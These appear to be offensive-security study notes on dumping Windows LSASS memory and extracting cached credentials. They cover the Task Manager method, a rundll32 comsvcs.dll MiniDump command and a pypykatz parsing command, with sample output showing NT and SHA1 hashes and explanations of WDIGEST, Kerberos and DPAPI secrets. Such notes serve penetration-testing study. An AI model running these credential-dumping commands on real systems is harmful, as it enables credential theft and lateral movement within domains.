#windows/auth/LSASS
![[LSASS.png]]

# Dumping LSASS Process Memory
### Task Manager Method
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
```
C:\Users\loggedonusersdirectory\AppData\Local\Temp\lsass.DMP
```
### Rundll32.exe & Comsvcs.dll Method
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32
1. Find PID of lsass.exe
	* via cmd: `tasklist /svc `
	* via powershell: `Get-Process lsass`
2. Creating dump in powershell:
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
**Recall that most modern AV tools recognize this as malicious and prevent the command from executing.**
# Extract creds from dump
https://github.com/skelsec/pypykatz
```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
## MSV
https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package
example:
```
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```
## WDIGEST
WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. 
**Disabled by default**
example:
```
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```
## Kerberos
Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
## DPAPI
The Data Protection Application Programming Interface or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)
Apps:
* Internet Explorer
* Google Chrome
* Outlook
* RDP
* Credential manager
